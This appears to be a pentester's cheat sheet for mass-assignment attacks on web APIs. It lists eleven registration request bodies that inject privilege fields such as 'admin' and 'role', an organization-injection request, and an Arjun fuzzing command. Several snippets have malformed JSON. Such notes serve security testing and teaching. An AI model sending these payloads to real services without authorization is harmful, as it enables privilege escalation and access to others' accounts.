**Try This Vulnerability in**
```
Account Registration
Unauthorized Access to Organizations
reset password 
login
change email
change username
```
**Account Registration**
the basic request
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"password":"Password1!"
}
```

try
1-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": true,
"password":"Password1!"
}
```
2-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ADMIN": true,
"password":"Password1!"
}
```

3-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"isadmin": true,
"password":"Password1!"
}
```

4-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ISADMIN": true,
"password":"Password1!"
}
```

5-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"Admin": true,
"password":"Password1!"
}
```

6- 
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": admin,
"password":"Password1!"
}
```

7- 
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": ADMIN,
"password":"Password1!"
}
```

8-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": administrator,
"password":"Password1!"
}
```

9-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": administrator,
"password":"Password1!"
}
```

10-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": admin,
"password":"Password1!"
}
```

11-
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": 1,
"password":"Password1!"
}
```

**Unauthorized Access to Organizations**
```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"org": "§CompanyA§",
"password":"Password1!"
}
```

**Finding Variables in Documentation**
```
by reading the document you can find variable
```

**Fuzzing Unknown Variables**
```
Another common scenario is that you’ll perform an action in a web application, intercept the request, and locate several bonus headers or parameters 
within it, like so:

POST /create/user
--snip--
{
"username": "hapi_hacker"
"pass": "ff7ftw",
"uam": 1,
"mfa": true,
"account": 101
}
```

Automating Mass Assignment Attacks with Arjun and burp Suite Intruder
```
 arjun --headers "Content-Type: application/json]" -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
```
